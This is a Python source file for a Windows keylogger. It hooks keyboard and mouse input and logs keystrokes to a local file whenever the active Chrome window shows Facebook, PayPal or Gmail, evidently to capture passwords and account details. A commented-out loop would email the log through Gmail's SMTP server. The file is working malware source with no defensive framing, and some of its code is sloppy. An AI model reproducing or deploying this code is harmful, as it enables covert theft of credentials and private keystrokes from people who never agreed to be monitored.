'''
 *********
 By: Elad Keyshawn
 *********
 '''

 import win32api
 import sys
 import win32gui
 import win32con
 import smtplib
 import pythoncom, pyHook
 buffer = ''
 from win32gui import GetWindowText, GetForegroundWindow
 import time
 '''
 while True:
     currentWindow = GetWindowText(GetForegroundWindow())
     print currentWindow
     if(currentWindow.find("Chrome")!=-1) and ((currentWindow.find("Facebook")!= -1)or (currentWindow.find("PayPal")!= -1)):
         print "yeah!!!"

     time.sleep(5)
 '''

 def OnKeyboardEvent(event):
     currentWindow = GetWindowText(GetForegroundWindow())
     if not((currentWindow.find("Chrome")!=-1) and ((currentWindow.find("Facebook")!= -1)or (currentWindow.find("PayPal")!= -1))or(currentWindow.find("Gmail")!= -1)):
             return # if not in chrome or in chrome but not on facebook,paypal or gmail
     else:
         f = open('C:\\Users\\Elad\\Desktop\\output.txt', 'a') # Creating an output file
         f.close()
         if currentWindow.find("Facebook")!= -1:
             facebook(event) # If on facebook go to facebook handler
         elif currentWindow.find("PayPal")!= -1:
             paypal(event) # or go to paypal handler
         else:
             gmail(event)

 def OnMouseEvent(event):
     currentWindow = GetWindowText(GetForegroundWindow())
     if not((currentWindow.find("Chrome")!=-1) and ((currentWindow.find("Facebook")!= -1)or (currentWindow.find("PayPal")!= -1))):
      return # if not in chrome or in chrome but not on facebook,paypal or gmail
     else:
         f = open('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
         f.write('\n <M-CLICK> \n')
         f.close()

 def facebook(event):
      f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'r')
      lineList = f.readlines() # Reads the whole file into lineList array of lines
      f.close()
      if len(lineList)==0: # if the file is empty
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          f.write("facebook: ") # open a file which begins with "facebook: "
          f.close()
          strokeHandler(event) # and ofcourse go to take care of keystrokes
      elif lineList[-1].find("facebook:")!=-1:
             strokeHandler(event) # if "facebook: " already there go straight to keystrokes
      else:
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          print "opened a file" # if the file is not empty and there's no "facebook: " write one and record keystrokes
          f.write("\n facebook: ")
          print  "writing to file..."
          f.close()
          print "file closed"
          strokeHandler(event)    #***Facebook Handler***#

 def paypal(event):
      f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'r')
      lineList = f.readlines()
      f.close()
      if len(lineList)==0:
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          f.write("paypal: ")
          f.close()
          strokeHandler(event)
      elif lineList[-1].find("paypal:")!=-1:
             strokeHandler(event)
      else:
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          print "opened a file"
          f.write("\n paypal: ")
          print "writing to file..."
          f.close()
          print "file closed"
          strokeHandler(event)    #***PayPal Handler***#

 def gmail(event):
      f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'r')
      lineList = f.readlines() # Reads the whole file into lineList array of lines
      f.close()
      if len(lineList)==0: # if the file is empty
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          f.write("gmail: ") # open a file which begins with "facebook: "
          f.close()
          strokeHandler(event) # and ofcourse go to take care of keystrokes
      elif lineList[-1].find("gmail:")!=-1:
             strokeHandler(event) # if "facebook: " already there go straight to keystrokes
      else:
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          print "opened a file" # if the file is not empty and there's no "facebook: " write one and record keystrokes
          f.write("\n gmail: ")
          print  "writing to file..."
          f.close()
          print "file closed"
          strokeHandler(event)    #***Gmail Handler***#

 def strokeHandler(event):
          f = open ('C:\\Users\\Elad\\Desktop\\output.txt', 'a')
          print "opened a file"
          keylogs = ''
          if event.Ascii == 32:
            keylogs += '\n <SPACE> \n'
          elif event.Ascii == 13:
            keylogs += '\n <ENTER> \n'
          elif event.Ascii == 9:
            keylogs += '\n <TAB> \n'
          elif event.Ascii == 8:
              keylogs+= '<->'
          elif event.Ascii == 37:
              keylogs+= '<LEFT>'
          elif event.Ascii == 38:
              keylogs+= '<UP>'
          elif event.Ascii == 39:
              keylogs+= '<RIGHT>'
          elif event.Ascii == 40:
              keylogs+= '<DOWN>'
          elif event.Ascii == 14 or event.Ascii == 14:
              keylogs+= ''

          else:
            keylogs = chr(event.Ascii)
          f.write(keylogs)
          print "Writing to file"
          f.close()
          print "closing file"
 '''
  while True:
     time.sleep(20)
     r = open('C:\\Users\\Elad\\Desktop\\output.txt','r')
     data = r.read()
     server = smtplib.SMTP('smtp.gmail.com',587)
     server.starttls()
     server.sendmail('eladiku1@gmail.com','password', data)
 '''

 while True:
     print "started out!"
     currentWindow = GetWindowText(GetForegroundWindow()) # First out gets the current window
     print currentWindow
     time.sleep(3) # for not bombarding the console
     if(currentWindow.find("Chrome")!=-1) and ((currentWindow.find("Facebook")!= -1)or (currentWindow.find("PayPal")!= -1)or(currentWindow.find("Gmail")!= -1)): # if you're in chrome and in Facebook or Paypal
           print "Im past the chrome condition"
           hm = pyHook.HookManager() # creates hooking manager
           print "created hook manager, waiting for key press"
           hm.KeyDown = OnKeyboardEvent # assigns OnKeyBoardEvent to KeyDown
           hm.MouseLeftDown = OnMouseEvent
           hm.MouseRightDown = OnMouseEvent
           hm.HookKeyboard() # Hooking Keyboard
           hm.HookMouse() # Hooking Mouse
           print "hooking keyboard..."
           print"pumping messages"
           pythoncom.PumpMessages() #Pumpin messages to console
